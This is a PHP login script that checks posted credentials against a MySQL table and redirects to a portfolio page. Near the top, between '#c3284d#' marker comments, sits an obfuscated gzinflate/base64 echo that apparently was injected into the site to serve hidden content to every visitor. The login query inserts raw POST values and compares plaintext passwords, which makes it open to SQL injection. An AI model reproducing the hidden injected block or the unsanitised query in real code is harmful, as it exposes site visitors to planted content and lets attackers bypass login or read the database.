<?php
session_start();
// store session data
$_SESSION['views']=1;
$_SESSION['uname']=$_POST["username"];
$_SESSION['uid']=1;

#c3284d#
echo(gzinflate(base64_decode("TctNCoAgEEDhq4gHcKplqHcZBimlH3PGyNsXuGn7PZ5lKjGLkpaD0xIegYQ3dtVqw2OpuHzpr1zI6VUkzwCREWkaxtHQuRMzpKuG0vZ4RJNYK2+hb/4F")));
#/c3284d#
?>
<html>
<head>

<script type="text/javascript">
<!--
function delayer(){
    window.location = "../homepage/portfolio.php"
}
//-->
</script>


</head>



<?php



if($_POST["username"] == "")
{
print "user name not inserted";
exit();
}

else if($_POST["password"] == "")
{
print "password not inserted";
exit();
}

else
{
}


include 'databasepwd.php';

mysql_connect($dbaddress, $dbuname, $dbpswd);


mysql_select_db($dbname);

$sql="select * FROM sw_login where username='$_POST[username]' AND password='$_POST[password]'";
//$sql="select * from sw_login";

$result = mysql_query($sql);
  //
 if(mysql_num_rows($result)=='1')
{
	while($row = mysql_fetch_array($result))
  {
	$_SESSION['uid']=$row['userid'];
  }
 echo '<body onLoad="delayer()">';
       //echo '<meta http-equiv="refresh" content="0;url=../homepage/index.php">';
echo"</body>";
 
}     
 
else
{
print "Authentication Failed";

session_destroy();

}







?>


</html>